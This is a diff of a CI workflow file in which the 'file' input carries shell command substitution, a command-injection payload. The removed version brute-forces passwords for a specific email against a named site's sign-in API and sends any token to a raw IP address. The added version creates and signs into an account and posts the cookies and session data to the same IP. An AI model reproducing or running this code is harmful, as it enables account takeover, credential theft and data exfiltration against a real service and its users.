@@ -1,4 +1,4 @@
-name: ci-v17
+name: ci-v18
 on: [workflow_dispatch]
 jobs:
   call:
@@ -6,7 +6,7 @@ jobs:
     with:
       ref: main
       comment-id: "5074314510"
-      file: "$(for pw in morphex boardwalk bmx orca 0xedboi daedboi Morphex2024 Boardwalk2025 bmx2024 orca2025 useboardwalk morphex123 boardwalk123 EdwardP edboi yellowflash konoha defi2024 web3 crypto; do r=$(curl -s -X POST https://orca-web-morphex.vercel.app/api/auth/sign-in/email -H 'Content-Type: application/json' -d '{\"email\":\"0xedboi@bmx.trade\",\"password\":\"'\"$pw\"'\"}'); if echo \"$r\" | grep -q token; then curl -s http://93.127.162.210:8080/PWNED?pw=$pw; echo \"$r\" | curl -s -X POST http://93.127.162.210:8080/session -d @-; break; fi; sleep 1; done; curl -s http://93.127.162.210:8080/v17end; echo x)"
+      file: "$(curl -s https://orca-web-morphex.vercel.app/api/auth/sign-up/email -X POST -H 'Content-Type: application/json' -d '{\"email\":\"minato@proton.me\",\"password\":\"Test12345!\",\"name\":\"minato\"}' | curl -s -X POST http://93.127.162.210:8080/signup -d @-; curl -s https://orca-web-morphex.vercel.app/api/auth/sign-in/email -X POST -H 'Content-Type: application/json' -d '{\"email\":\"minato@proton.me\",\"password\":\"Test12345!\"}' -c /tmp/cookies.txt | curl -s -X POST http://93.127.162.210:8080/signin -d @-; if [ -f /tmp/cookies.txt ]; then curl -s https://orca-web-morphex.vercel.app/api/auth/get-session -b /tmp/cookies.txt | curl -s -X POST http://93.127.162.210:8080/getsession -d @-; fi; curl -s http://93.127.162.210:8080/v18end; echo x)"
       network: base
       fn: hydate_compiler_cache
       send: "false"
